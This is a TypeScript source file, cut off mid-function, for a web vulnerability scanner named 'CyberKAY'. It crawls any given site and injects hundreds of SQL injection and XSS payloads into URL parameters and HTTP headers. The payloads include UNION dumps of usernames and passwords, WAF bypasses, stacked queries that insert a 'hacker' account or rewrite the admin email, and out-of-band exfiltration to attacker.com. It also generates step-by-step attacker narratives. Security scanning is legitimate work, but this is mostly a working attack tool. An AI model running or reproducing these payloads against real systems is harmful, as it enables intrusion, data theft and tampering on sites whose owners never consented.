import express from 'express';
import { createServer as createViteServer } from 'vite';
import * as cheerio from 'cheerio';
import { URL } from 'url';

const PORT = 3000;

// --- Types ---

interface VulnerabilityReport {
  type: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low' | 'Info';
  description: string;
  recommendation: string;
  location: string; // URL or specific parameter
  payload?: string; // The specific payload that triggered it
  evidence?: string; // Snippet of the response proving the vuln
  exploitationSteps?: string; // Step-by-step exploitation guide
}

interface ScanResult {
  target: string;
  timestamp: string;
  score: number;
  crawledUrls: string[];
  vulnerabilities: VulnerabilityReport[];
  headers: Record<string, string>;
}

// --- Payloads & Signatures ---

const SQL_ERRORS = [
  /SQL syntax.*MySQL/i,
  /Warning.*mysql_/i,
  /valid MySQL result/i,
  /MySqlClient\./i,
  /PostgreSQL.*ERROR/i,
  /Driver.* SQL[-_]Server/i,
  /ORA-[0-9][0-9][0-9][0-9]/i,
  /Microsoft Access Driver/i,
  /Jet Database Engine/i,
  /SQLite/i,
  /syntax error/i,
  /unclosed quotation mark/i,
  /quoted string not properly terminated/i,
  /mysql_fetch_array/i,
  /mysql_num_rows/i,
  /Input String was not in a correct format/i,
  /An illegal character has been found/i,
  /SQL command not properly ended/i,
  /Query failed/i,
  /ORA-00933/i,
  /PSQLException/i,
  /CLI Driver/i,
  /DB2 SQL error/i,
  /Sybase message/i,
  /Unclosed quotation mark after the character string/i,
  /SQLServer JDBC Driver/i,
  /System.Data.SqlClient.SqlException/i,
  /System.Data.SQLite.SQLiteException/i,
  /Informix ODBC Driver/i,
  /ODBC SQL Server Driver/i,
  /SQL command not properly ended/i,
  /macromedia.jdbc.sqlserver/i,
  /com.mysql.jdbc.exceptions/i,
  /org.hibernate.exception.SQLGrammarException/i,
  /java.sql.SQLException/i,
  /Zend_Db_Statement_Exception/i
];

const SQL_PAYLOADS = [
  // 1. Classic Auth Bypass & Tautologies
  "' OR '1'='1",
  '" OR "1"="1',
  "' OR 1=1 --",
  "' OR 1=1#",
  "' OR 1=1/*",
  "') OR '1'='1--",
  "') OR ('1'='1",
  "admin' --",
  "admin' #",
  "admin'/*",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "' OR '1'='1' #",
  "' OR 1=1 -- -",
  "' OR 1=1 --+",
  "1' OR 1=1 --",
  "1' OR '1'='1",
  "1'1",
  "1'1'",
  "1 OR 1=1",
  "1' OR 1=1",
  "' or 1=1 limit 1 -- -+",
  "' or 1=1 limit 1 --",
  "' or 1=1 limit 1 #",
  
  // 2. Union Select (Guessing Columns 1-10)
  "' UNION SELECT 1 --",
  "' UNION SELECT 1,2 --",
  "' UNION SELECT 1,2,3 --",
  "' UNION SELECT 1,2,3,4 --",
  "' UNION SELECT 1,2,3,4,5 --",
  "' UNION SELECT 1,2,3,4,5,6 --",
  "' UNION SELECT 1,2,3,4,5,6,7 --",
  "' UNION SELECT 1,2,3,4,5,6,7,8 --",
  "' UNION SELECT 1,2,3,4,5,6,7,8,9 --",
  "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
  "' UNION SELECT null --",
  "' UNION SELECT null,null --",
  "' UNION SELECT null,null,null --",
  "' UNION SELECT null,null,null,null --",
  "' UNION SELECT null,null,null,null,null --",
  "' UNION SELECT null,null,null,null,null,null --",
  "' UNION SELECT null,null,null,null,null,null,null --",
  
  // 3. Error Based (MySQL, PostgreSQL, MSSQL, Oracle)
  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
  "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT version()))) --",
  "' AND 1=CONVERT(int, (SELECT @@version)) --", // MSSQL
  "' AND 1=CAST((SELECT version()) AS int) --", // Postgres
  "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1)) --", // Oracle
  "'",
  "\"",
  "`",
  "')",
  "';",
  
  // 4. Time Based (Blind)
  "'; WAITFOR DELAY '0:0:5' --", // MSSQL
  "' AND SLEEP(5) --", // MySQL
  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --", // MySQL Alternative
  "'; SELECT pg_sleep(5) --", // Postgres
  "' || (SELECT 1 FROM DUAL WHERE 1=1 AND SLEEP(5)) --",
  "1' AND SLEEP(5)#",
  "1' AND SLEEP(5)--",
  
  // 5. Boolean Based (Blind)
  "' AND 1=1 --",
  "' AND 1=0 --",
  "' AND 1=1 #",
  "' AND 1=0 #",
  "1 AND 1=1",
  "1 AND 1=0",
  "' AND '1'='1",
  "' AND '1'='0",
  "' AND '1'='1'--",
  "' AND '1'='0'--",
  
  // 6. Database Specific & Version Extraction
  "' UNION SELECT @@version,null --",
  "' UNION SELECT version(),null --",
  "' UNION SELECT @@version,null,null --",
  "' UNION SELECT version(),null,null --",
  "' UNION SELECT table_name, 1, 1 FROM information_schema.tables --",
  
  // 7. Order By / Group By Testing
  "1' ORDER BY 1--+",
  "1' ORDER BY 2--+",
  "1' ORDER BY 3--+",
  "1' ORDER BY 100--+", 
  "1' GROUP BY 1--+",
  
  // 8. Comment Polyglots & WAF Bypass
  "/**/",
  "/*!*/",
  "/*!50000*/",
  "'%20OR%201=1--",
  "'%20UNION%20SELECT%201,2--",
  "'+OR+1=1--",
  "'/**/OR/**/1=1--",
  "admin'--",
  "admin'/*",
  "' or 1=1--",
  "' or 1=1/*",
  "') or ('1'='1--",
  "') or ('1'='1/*",
  
  // 9. Stacked Queries (MSSQL/Postgres)
  "; WAITFOR DELAY '0:0:5' --",
  "; SELECT pg_sleep(5) --",
  "; DROP TABLE users --",
  "; SELECT * FROM information_schema.tables --",
  
  // 10. More Variations
  "-1' UNION SELECT 1,2,3--+",
  "-1' UNION SELECT 1,2,3,4--+",
  "-1 UNION SELECT 1,2,3--",
  "-1 UNION SELECT 1,2,3,4--",
  "1 OR 1=1 LIMIT 1",
  "1' OR 1=1 LIMIT 1",
  "1' OR 1=1 LIMIT 1--",
  "1' OR 1=1 LIMIT 1#",
  "' OR 1=1 LIMIT 1--",
  "' OR 1=1 LIMIT 1#",
  "' + '1' + '1",
  "' || '1' || '1",
  "1' AND 1=1 AND '%'='",
  "1' AND 1=0 AND '%'='",
  "admin' AND 1=1 --",
  "admin' AND 1=0 --",
  "' OR 'a'='a",
  "' OR 'a'='a' --",
  "' OR 'a'='a' /*",
  "' OR 'a'='a' #",
  "1' OR 'a'='a",
  "1' OR 'a'='a' --",
  "1' OR 'a'='a' #",
  "1' OR 'a'='a' /*",
  "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--",
  "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--",
  "' UNION ALL SELECT null, null, null, null, null, null--",
  // 11. Data Extraction (Common Tables & Columns)
  "' UNION SELECT 1, user(), 3 --",
  "' UNION SELECT 1, database(), 3 --",
  "' UNION SELECT 1, @@hostname, 3 --",
  "' UNION SELECT 1, version(), 3 --",
  "' UNION SELECT 1, table_name, 3 FROM information_schema.tables --",
  "' UNION SELECT 1, column_name, 3 FROM information_schema.columns --",
  "' UNION SELECT 1, username, password FROM users --",
  "' UNION SELECT 1, user, pass FROM users --",
  "' UNION SELECT 1, username, password FROM admin --",
  "' UNION SELECT 1, user, pass FROM admin --",
  "' UNION SELECT 1, email, password FROM users --",
  "' UNION SELECT 1, email, hash FROM users --",
  // DIOS (Dump In One Shot) - MySQL
  "' UNION SELECT 1, (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] > ',table_name,' > ',column_name))))x), 3 --",
  // MSSQL
  "' UNION SELECT 1, (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES), 3 --",
  // PostgreSQL
  "' UNION SELECT 1, current_database(), 3 --",
  "' UNION SELECT 1, user, 3 --",
  // 12. MySQL Information Schema (Tables)
  "' UNION SELECT table_name, null FROM information_schema.tables --",
  "' UNION SELECT table_name, null, null FROM information_schema.tables --",
  "' UNION SELECT table_name, null, null, null FROM information_schema.tables --",
  "' UNION SELECT table_name, null, null, null, null FROM information_schema.tables --",
  "' UNION SELECT table_name, table_schema, null FROM information_schema.tables WHERE table_schema=database() --",
  "' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database() --",
  "' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users' --",
  
  // 13. PostgreSQL Information Schema
  "' UNION SELECT table_name, null FROM information_schema.tables --",
  "' UNION SELECT table_name, null, null FROM information_schema.tables --",
  "' UNION SELECT tablename, null FROM pg_catalog.pg_tables --",
  "' UNION SELECT string_agg(table_name, ','), null FROM information_schema.tables WHERE table_schema='public' --",
  
  // 14. MSSQL Information Schema
  "' UNION SELECT table_name, null FROM information_schema.tables --",
  "' UNION SELECT name, null FROM master..sysdatabases --",
  "' UNION SELECT name, null FROM sys.tables --",
  
  // 15. Oracle
  "' UNION SELECT table_name, null FROM all_tables --",
  "' UNION SELECT table_name, null FROM user_tables --",
  "' UNION SELECT owner, table_name FROM all_tables --",
  
  // 16. SQLite
  "' UNION SELECT name, null FROM sqlite_master WHERE type='table' --",
  "' UNION SELECT sql, null FROM sqlite_master WHERE type='table' --",
  "' UNION SELECT 1, group_concat(tbl_name), 3 FROM sqlite_master WHERE type='table' --",

  // 17. Error-Based Extraction (MySQL)
  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
  
  // 18. Blind Extraction (Guessing Table Names)
  "' AND (SELECT substring(table_name,1,1) FROM information_schema.tables LIMIT 1)='a' --",
  "' AND (SELECT substring(table_name,1,1) FROM information_schema.tables LIMIT 1)='u' --",
  "' AND (SELECT substring(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='u' --",

  // 19. Advanced WAF Bypass for Extraction
  "'/**/UNION/**/SELECT/**/table_name,/**/1/**/FROM/**/information_schema.tables/**/--",
  "'%20UNION%20SELECT%20table_name,1%20FROM%20information_schema.tables%20--",
  "'%0AUNION%0ASELECT%0Atable_name,1%0AFROM%0Ainformation_schema.tables%0A--",
  "'%09UNION%09SELECT%09table_name,1%09FROM%09information_schema.tables%09--",
  
  // 20. Column Enumeration
  "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --",
  "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='admin' --",
  "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='members' --",
  "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='accounts' --",
  
  // 21. Data Dumping (Generic)
  "' UNION SELECT username, password FROM users --",
  "' UNION SELECT user, pass FROM users --",
  "' UNION SELECT admin, password FROM admin --",
  "' UNION SELECT login, password FROM users --",
  "' UNION SELECT email, password FROM users --",
  "' UNION SELECT id, email, password FROM users --",
  
  // 22. Out-of-Band (OOB) Extraction (DNS)
  // MySQL (Windows)
  "' AND (SELECT 1 FROM (SELECT(LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.attacker.com\\abc'))))a) --",
  // Oracle
  "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual --",
  // MSSQL
  "'; DECLARE @v varchar(8000); SELECT @v = @@version; EXEC('master..xp_dirtree \"\\'+@v+'.attacker.com\\v\"'); --",
  
  // 23. No-Quote Payloads (Integer Injection)
  "UNION SELECT table_name, 1 FROM information_schema.tables --",
  "UNION SELECT table_name, 1, 1 FROM information_schema.tables --",
  "UNION SELECT 1, group_concat(table_name) FROM information_schema.tables --",
  
  // 24. Double Query Injection
  "' OR 1 GROUP BY CONCAT_WS(0x3a, version(), FLOOR(RAND(0)*2)) HAVING MIN(0) OR 1 --",
  
  // 25. Authentication Bypass Variations
  "' OR '1'='1' /*",
  "' OR '1'='1' --",
  "' OR '1'='1' #",
  "' OR '1'='1' AND '1'='1",
  "' OR 1=1 AND 1=1",
  
  // 26. Time-Based Variations
  "'; WAITFOR DELAY '0:0:10' --",
  "' AND SLEEP(10) --",
  "'; SELECT pg_sleep(10) --",
  
  // 27. Stacked Queries (Drop/Update - Dangerous)
  // "; DROP TABLE users --", // Commented out for safety, but good for testing
  // "; UPDATE users SET password='hacked' --",
  
  // 28. Polyglots
  "SLEEP(5) /*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
  
  // 29. JSON Extraction (Modern DBs)
  "' UNION SELECT json_extract(data, '$.password') FROM users --",
  
  // 30. XML Extraction
  "' UNION SELECT ExtractValue(xml_data, '/root/password') FROM users --",
  // 31. Marker-Based Extraction (For Evidence)
  // MySQL / PostgreSQL / SQLite (Concat/Pipe)
  "' UNION SELECT CONCAT('~CK~',table_name,'~CK~'), null FROM information_schema.tables --",
  "' UNION SELECT 1, CONCAT('~CK~',table_name,'~CK~') FROM information_schema.tables --",
  "' UNION SELECT 1, CONCAT('~CK~',table_name,'~CK~'), 3 FROM information_schema.tables --",
  "' UNION SELECT 1, 2, CONCAT('~CK~',table_name,'~CK~') FROM information_schema.tables --",
  "' UNION SELECT 1, 2, 3, CONCAT('~CK~',table_name,'~CK~') FROM information_schema.tables --",
  
  // Group Concat (All tables in one row)
  "' UNION SELECT CONCAT('~CK~',group_concat(table_name),'~CK~'), null FROM information_schema.tables WHERE table_schema=database() --",
  "' UNION SELECT 1, CONCAT('~CK~',group_concat(table_name),'~CK~') FROM information_schema.tables WHERE table_schema=database() --",
  "' UNION SELECT 1, CONCAT('~CK~',group_concat(table_name),'~CK~'), 3 FROM information_schema.tables WHERE table_schema=database() --",

  // Oracle
  "' UNION SELECT '~CK~' || table_name || '~CK~', null FROM all_tables --",
  "' UNION SELECT 1, '~CK~' || table_name || '~CK~' FROM all_tables --",
  
  // MSSQL
  "' UNION SELECT '~CK~' + name + '~CK~', null FROM sys.tables --",
  "' UNION SELECT 1, '~CK~' + name + '~CK~' FROM sys.tables --",

  // 32. Advanced Blind SQLi (Bitwise/Math)
  "' AND 1=(SELECT 1 FROM information_schema.tables LIMIT 1) --",
  "' AND (SELECT count(*) FROM information_schema.tables) > 0 --",
  "' AND ascii(substring((SELECT database()),1,1)) > 64 --",
  "' AND ascii(substring((SELECT database()),1,1)) < 122 --",
  
  // 33. Time-Based (Heavy Queries)
  "' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) --",
  "' AND (SELECT count(*) FROM generate_series(1,5000000)) --", // Postgres
  
  // 34. Error-Based (XML/XPath)
  "' AND extractvalue(rand(),concat(0x3a,version())) --",
  "' AND updatexml(rand(),concat(0x3a,version()),null) --",
  
  // 35. Stacked Queries (Insert/Update)
  "; INSERT INTO users (username, password) VALUES ('hacker', 'pwned') --",
  "; UPDATE users SET email='hacker@evil.com' WHERE username='admin' --",
  
  // 36. WAF Bypass (Whitespace/Encoding)
  "'%0AUNION%0ASELECT%0A1,2,3--",
  "'%0BUNION%0BSELECT%0B1,2,3--",
  "'%0CUNION%0CSELECT%0B1,2,3--",
  "'%0DUNION%0DSELECT%0B1,2,3--",
  "'%A0UNION%A0SELECT%A01,2,3--",
  
  // 37. Conditional Errors
  "' AND (SELECT 1/0) --", // Divide by zero if true
  "' AND CASE WHEN (1=1) THEN 1/0 ELSE 1 END --",
  
  // 38. Out-of-Band (HTTP/SMB)
  "'; exec master..xp_dirtree '\\\\attacker.com\\share' --",
  "' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\file.txt') --",
  
  // 39. No-Space Injection
  "'UNION(SELECT(1),version(),(3))--",
  "'UNION(SELECT(1),table_name,(3)FROM(information_schema.tables))--",
  
  // 40. Filter Bypass (Hex/Char)
  "' UNION SELECT 0x61646d696e, 0x70617373776f7264 --", // admin, password
  "' UNION SELECT CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110), 1 --",
  
  // 41. Second Order Injection Markers
  "admin' --",
  "testuser' #",
  "guest' /*",
  
  // 42. Blind SQLi with Bit Shifting
  "' AND (ORD(MID((SELECT IFNULL(CAST(schema_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1)) >> 0 & 1) --",
  
  // 43. H2 Database Injection
  "' UNION SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --",
  
  // 44. SQLite Injection
  "' UNION SELECT 1, name, sql FROM sqlite_master --",
  
  // 45. Access Injection
  "' UNION SELECT 1, name, 3 FROM MSysObjects WHERE type=1 --",
  
  // 46. Sybase Injection
  "' UNION SELECT 1, name, 3 FROM sysobjects WHERE type='U' --",
  
  // 47. DB2 Injection
  "' UNION SELECT 1, tabname, 3 FROM syscat.tables --",
  
  // 48. Informix Injection
  "' UNION SELECT 1, tabname, 3 FROM systables --",
  
  // 49. Firebird Injection
  "' UNION SELECT 1, rdb$relation_name, 3 FROM rdb$relations --",
  
  // 50. SAP MaxDB Injection
  "' UNION SELECT 1, tablename, 3 FROM tables --",
  
  // 51. Ingres Injection
  "' UNION SELECT 1, table_name, 3 FROM iitables --",
  
  // 52. MimerSQL Injection
  "' UNION SELECT 1, table_name, 3 FROM information_schema.tables --",
  
  // 53. MonetDB Injection
  "' UNION SELECT 1, name, 3 FROM tables --",
  
  // 54. Vertica Injection
  "' UNION SELECT 1, table_name, 3 FROM tables --",
  
  // 55. Mckoi Injection
  "' UNION SELECT 1, name, 3 FROM table_info --",
  
  // 56. Presto Injection
  "' UNION SELECT 1, table_name, 3 FROM information_schema.tables --",
  
  // 57. Altibase Injection
  "' UNION SELECT 1, table_name, 3 FROM system_.sys_tables_ --",
  
  // 58. CUBRID Injection
  "' UNION SELECT 1, class_name, 3 FROM db_class --",
  
  // 59. InterSystems Cache Injection
  "' UNION SELECT 1, TABLE_NAME, 3 FROM INFORMATION_SCHEMA.TABLES --",
  
  // 60. eXtremeDB Injection
  "' UNION SELECT 1, table_name, 3 FROM tables --"
];

const XSS_PAYLOADS = [
  "<script>alert('CyberKAY')</script>",
  "\"><script>alert('CyberKAY')</script>",
  "<img src=x onerror=alert(1)>",
  "' onmouseover='alert(1)"
];

// --- Helper Functions ---

function calculateScore(vulns: VulnerabilityReport[]): number {
  let score = 100;
  for (const v of vulns) {
    switch (v.severity) {
      case 'Critical': score -= 40; break;
      case 'High': score -= 25; break;
      case 'Medium': score -= 15; break;
      case 'Low': score -= 5; break;
      case 'Info': score -= 1; break;
    }
  }
  return Math.max(0, score);
}

// --- Crawler ---

async function crawl(startUrl: string, maxPages: number = 40): Promise<string[]> {
  const visited = new Set<string>();
  const queue: string[] = [startUrl];
  const foundUrls: string[] = [];
  const domain = new URL(startUrl).hostname;

  while (queue.length > 0 && visited.size < maxPages) {
    const currentUrl = queue.shift()!;
    if (visited.has(currentUrl)) continue;

    visited.add(currentUrl);
    foundUrls.push(currentUrl);

    try {
      const response = await fetch(currentUrl, { 
        headers: { 'User-Agent': 'CyberKAY-Scanner/2.0' },
        signal: AbortSignal.timeout(10000) // 10s timeout per page
      });
      
      if (!response.ok) continue;
      
      const html = await response.text();
      const $ = cheerio.load(html);

      $('a').each((_, el) => {
        const href = $(el).attr('href');
        if (href) {
          try {
            const absoluteUrl = new URL(href, currentUrl).toString();
            if (new URL(absoluteUrl).hostname === domain && !visited.has(absoluteUrl)) {
              queue.push(absoluteUrl);
            }
          } catch (e) { /* invalid url */ }
        }
      });
    } catch (e) {
      console.error(`Failed to crawl ${currentUrl}:`, e);
    }
  }
  return foundUrls;
}

// --- WAF Bypass Generators ---

function generateWafBypassPayloads(basePayload: string): string[] {
  const payloads: string[] = [];
  
  // 1. Case Variation (uNiOn sElEcT)
  payloads.push(basePayload.replace(/UNION/gi, 'uNiOn').replace(/SELECT/gi, 'sElEcT').replace(/OR/gi, 'oR').replace(/AND/gi, 'aNd'));
  
  // 2. Comment Injection (SEL/**/ECT)
  payloads.push(basePayload.replace(/ /g, '/**/').replace(/UNION/gi, 'UN/**/ION').replace(/SELECT/gi, 'SEL/**/ECT'));
  
  // 3. Space Replacement (+ or %09)
  payloads.push(basePayload.replace(/ /g, '+'));
  payloads.push(basePayload.replace(/ /g, '%09'));
  
  // 4. Double URL Encoding
  try {
    payloads.push(encodeURIComponent(encodeURIComponent(basePayload)));
  } catch (e) {}

  return payloads;
}

// --- Constants ---
const SCAN_TIMEOUT_MS = 55000; // 55 seconds global timeout (leaving buffer for 60s proxies)

// --- Scanners ---

async function scanHeadersAndCookies(url: string, deadline: number): Promise<VulnerabilityReport[]> {
  const vulns: VulnerabilityReport[] = [];
  const target = new URL(url);
  
  // Headers to fuzz
  const headersToTest = [
    'User-Agent',
    'Referer',
    'X-Forwarded-For',
    'Cookie'
  ];

  // Use a subset of high-impact payloads for headers to avoid excessive noise
  const headerPayloads = [
    "'", 
    "' OR '1'='1", 
    "' AND SLEEP(5) --",
    "admin' --"
  ];

  for (const header of headersToTest) {
    for (const payload of headerPayloads) {
      if (Date.now() > deadline) return vulns; // Timeout check

      try {
        const headers: Record<string, string> = {
          'User-Agent': 'CyberKAY-Scanner/2.0' // Default
        };
        
        // Inject payload into specific header
        headers[header] = payload;

        const startTime = Date.now();
        const res = await fetch(url, { headers, signal: AbortSignal.timeout(5000) });
        const text = await res.text();
        const duration = Date.now() - startTime;

        // Check for Error-Based
        for (const errorRegex of SQL_ERRORS) {
          if (errorRegex.test(text)) {
            vulns.push({
              type: `SQL Injection (${header} Header)`,
              severity: 'Critical',
              description: `The application is vulnerable to SQL injection via the '${header}' HTTP header. This often happens when applications log header values directly to a database without sanitization.`,
              recommendation: 'Sanitize all HTTP headers before using them in SQL queries. Use prepared statements for logging mechanisms.',
              location: `${header} Header`,
              payload: payload,
              evidence: text.match(errorRegex)?.[0],
              exploitationSteps: generateHackerScenario('Header Injection', header, payload)
            });
            break; 
          }
        }

        // Check for Time-Based
        if (payload.includes('SLEEP') && duration > 4000) {
             vulns.push({
              type: `Blind SQL Injection (${header} Header)`,
              severity: 'High',
              description: `The application responded significantly slower (${duration}ms) when a time-delay payload was injected into the '${header}' header.`,
              recommendation: 'Ensure database logging queries use parameterized inputs.',
              location: `${header} Header`,
              payload: payload,
              evidence: `Response time: ${duration}ms`,
              exploitationSteps: generateHackerScenario('Blind Header Injection', header, payload)
            });
            break;
        }
      } catch (e) {}
    }
  }
  return vulns;
}

// --- Hacker Scenario Generator ---

function generateHackerScenario(type: string, vector: string, payload: string): string {
  if (type.includes('Header')) {
    return `
1. **Reconnaissance**: The attacker identified that the application logs the '${vector}' header (e.g., for analytics or security logging).
2. **Injection**: By modifying the HTTP request, the attacker injected the payload \`${payload}\` into the '${vector}' header.
3. **Execution**: The backend logging system executed an INSERT or UPDATE query containing the malicious header value.
4. **Impact**: 
   - If error-based: The attacker can extract database version, user details, or table structures from the error logs or reflected error messages.
   - If blind: The attacker can use time-based inference to extract data character by character.
   - **Critical**: In some cases, this can lead to Second-Order SQL Injection if the logged value is later displayed in an admin panel (e.g., "Last Login IP"), executing the payload in the admin's session.`;
  }

  if (type.includes('Second-Order')) {
    return `
1. **Planting**: The attacker registered a user or submitted a form with the payload \`${payload}\` (e.g., as a username or comment).
2. **Storage**: The application sanitized the input for the *initial* INSERT query (e.g., escaping quotes), so it was stored safely in the database as a literal string: \`${payload}\`.
3. **Triggering**: Later, an administrator viewed a page (e.g., "User Profile" or "Audit Log") where this stored value was used in a *second* SQL query (e.g., SELECT * FROM logs WHERE username = '$stored_username').
4. **Execution**: Because the second query trusted the data coming from the database and didn't sanitize it again, the payload executed.
5. **Impact**: This could allow the attacker to dump the entire database, escalate privileges, or modify data, often affecting administrative users.`;
  }

  // Default / Standard SQLi
  return `
1. **Identification**: The attacker detected that the '${vector}' parameter is vulnerable.
2. **Exploitation**: Using the payload \`${payload}\`, the attacker manipulated the SQL query logic.
3. **Impact**: 
   - **Authentication Bypass**: If used on a login page, this allows logging in as the first user (usually Admin) without a password.
   - **Data Exfiltration**: Using UNION SELECT, the attacker can retrieve sensitive data (passwords, emails, credit cards) from other tables.
   - **System Compromise**: In certain configurations (e.g., MSSQL xp_cmdshell), this could lead to full remote code execution on the server.`;
}

async function scanSQLInjection(url: string, deadline: number): Promise<VulnerabilityReport[]> {
  const vulns: VulnerabilityReport[] = [];
  const target = new URL(url);
  const params = target.searchParams;

  // Baseline Request (for Boolean-Based comparison)
  let baselineLength = 0;
  let baselineStatus = 200;
  try {
      const res = await fetch(url, { headers: { 'User-Agent': 'CyberKAY-Scanner/2.0' }, signal: AbortSignal.timeout(5000) });
      const text = await res.text();
      baselineLength = text.length;
      baselineStatus = res.status;
  } catch (e) {}

  // Test each parameter
  for (const [key, value] of params.entries()) {
    if (Date.now() > deadline) break; // Timeout check

    // Combine standard payloads with WAF bypass variations
    let allPayloads = [...SQL_PAYLOADS];
    
    // Generate WAF bypasses for a subset of high-value payloads to keep scan time reasonable
    const highValuePayloads = [
      "' UNION SELECT 1, @@version --", 
      "' OR 1=1 --", 
      "' AND 1=1 --"
    ];
    
    for (const p of highValuePayloads) {
        allPayloads.push(...generateWafBypassPayloads(p));
    }

    for (const payload of allPayloads) {
      if (Date.now() > deadline) break; // Timeout check

      const testParams = new URLSearchParams(params);
      testParams.set(key, payload); // Inject payload
      const testUrl = `${target.origin}${target.pathname}?${testParams.toString()}`;

      try {
        const startTime = Date.now();
        const res = await fetch(testUrl, { headers: { 'User-Agent': 'CyberKAY-Scanner/2.0' }, signal: AbortSignal.timeout(10000) }); // Increased timeout for time-based
        const text = await res.text();
        const duration = Date.now() - startTime;

        // 1. Check for Error-Based SQLi
        for (const errorRegex of SQL_ERRORS) {
          if (errorRegex.test(text)) {
            vulns.push({
              type: 'SQL Injection (Error-Based)',
              severity: 'Critical',
              description: `The application returned a database error message when processing the payload. This indicates that the input is being directly concatenated into a SQL query without sanitization.`,
              recommendation: 'Use parameterized queries (Prepared Statements) for all database access. Do not concatenate user input into SQL strings.',
              location: testUrl,
              payload: payload,
              evidence: text.match(errorRegex)?.[0],
              exploitationSteps: generateHackerScenario('Standard', key, payload)
            });
            break; 
          }
        }

        // 2. Check for Time-Based Blind SQLi
        // We look for payloads that explicitly ask to sleep, and check if the response took > 4s
        // (Assuming the sleep payload was ~5s or more)
        if ((payload.includes('SLEEP') || payload.includes('WAITFOR') || payload.includes('pg_sleep')) && duration > 4000) {
             vulns.push({
              type: 'SQL Injection (Time-Based Blind)',
              severity: 'High',
              description: `The application took significantly longer (${duration}ms) to respond when a time-delay payload was injected. This suggests the database executed the sleep command.`,
              recommendation: 'Use parameterized queries. Ensure that database errors are caught and do not affect response time significantly if possible, though prepared statements are the primary fix.',
              location: testUrl,
              payload: payload,
              evidence: `Response time: ${duration}ms`,
              exploitationSteps: generateHackerScenario('Standard', key, payload)
            });
            // Removed break to continue testing all payloads
        }

        // 3. Check for Boolean-Based Blind SQLi (Response Length/Content Diff)
        // We need a True/False test pair for this.
        // If ' AND 1=1 returns same length as baseline, and ' AND 1=0 returns different length
        if (payload.includes('AND 1=1') || payload.includes('AND 1=0')) {
             const isTruePayload = payload.includes('1=1');
             const diff = Math.abs(text.length - baselineLength);
             
             // If True payload is close to baseline (or same status), but False payload is significantly different
             if (isTruePayload && (diff < 50 || res.status === baselineStatus)) {
                 // We need to verify the False case for this specific parameter
                 const falsePayload = payload.replace('1=1', '1=0');
                 const falseParams = new URLSearchParams(params);
                 falseParams.set(key, falsePayload);
                 const falseUrl = `${target.origin}${target.pathname}?${falseParams.toString()}`;
                 
                 const falseRes = await fetch(falseUrl, { headers: { 'User-Agent': 'CyberKAY-Scanner/2.0' }, signal: AbortSignal.timeout(5000) });
                 const falseText = await falseRes.text();
                 const falseDiff = Math.abs(falseText.length - baselineLength);

                 // Check if False case is significantly different from Baseline OR from True case
                 // Difference could be length OR status code (e.g. 500 error on False)
                 if (falseDiff > 100 || falseRes.status !== baselineStatus) { 
                     vulns.push({
                        type: 'SQL Injection (Boolean-Based Blind)',
                        severity: 'High',
                        description: `The application response changed significantly (Length diff: ${falseDiff}, Status: ${falseRes.status}) when a FALSE condition was injected compared to a TRUE condition.`,
                        recommendation: 'Use parameterized queries.',
                        location: testUrl,
                        payload: payload,
                        evidence: `Baseline Length: ${baselineLength}, True Length: ${text.length}, False Length: ${falseText.length}`,
                        exploitationSteps: generateHackerScenario('Standard', key, payload)
                     });
                 }
             }
        }
        
        // 4. Data Exfiltration (Banner Grabbing)
        // Check if we successfully extracted version info via Union or Error
        // Common version strings: 5.7.33, 8.0.21, PostgreSQL 12.4, Microsoft SQL Server 2019
        const versionMatch = text.match(/\d+\.\d+\.\d+|PostgreSQL \d+|Microsoft SQL Server \d+|Oracle Database \d+/);
        if (versionMatch && (payload.includes('UNION') || payload.includes('version'))) {
             vulns.push({
                type: 'Data Exfiltration (Database Version)',
                severity: 'Critical',
                description: `Successfully extracted database version information from the application response.`,
                recommendation: 'Sanitize inputs and suppress detailed error messages.',
                location: testUrl,
                payload: payload,
                evidence: `Extracted Version: ${versionMatch[0]}`,
                exploitationSteps: generateHackerScenario('Standard', key, payload)
             });
        }

        // 5. Marker-Based Extraction Check
        const markerMatch = text.match(/~CK~(.*?)~CK~/);
        if (markerMatch) {
             vulns.push({
                type: 'Data Exfiltration (Table Dump)',
                severity: 'Critical',
                description: `Successfully extracted database table names by injecting a marker.`,
                recommendation: 'Sanitize inputs and suppress detailed error messages.',
